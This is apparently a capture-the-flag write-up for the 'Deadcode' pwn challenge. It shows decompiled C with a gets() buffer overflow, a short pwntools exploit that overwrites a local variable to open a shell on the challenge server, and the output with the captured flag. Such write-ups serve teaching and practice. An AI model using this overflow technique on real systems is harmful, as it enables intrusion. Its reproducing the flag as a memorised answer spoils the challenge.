# Deadcode
**Category: Pwn**

Running the binary through Ghidra, we can see how this binary works:

```c
undefined8 main(void)

{
  char local_28 [24];
  long local_10;
  
  local_10 = 0;
  buffer_init();
  puts(
      "\nI\'m developing this new application in C, I\'ve setup some code for the new features butit\'s not (a)live yet."
      );
  puts("\nWhat features would you like to see in my app?");
  gets(local_28);
  if (local_10 == 0xdeadc0de) {
    puts("\n\nMaybe this code isn\'t so dead...");
    system("/bin/sh");
  }
  return 0;
}
```

If we can set `local_10` to have a value of `0xdeadc0de`, we will gain shell access. Since we write into `local_28` via the unsafe `gets` method, we'll be able to write extra bytes to overflow into the memory used for `local_10`.

Exploit:

```python
from pwn import *

context.binary = ELF('./deadcode')

if args.REMOTE:
    io = remote('pwn-2021.duc.tf', 31916)
else:
    io = process(context.binary.path)

io.sendline(flat(b'A'*24, p64(0xdeadc0de)))
io.interactive()
```

Run:
```
./exploit.py REMOTE
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to pwn-2021.duc.tf on port 31916: Done
[*] Switching to interactive mode

I'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet.

What features would you like to see in my app?


Maybe this code isn't so dead...
$ ls
flag.txt
pwn
$ cat flag.txt
DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}
```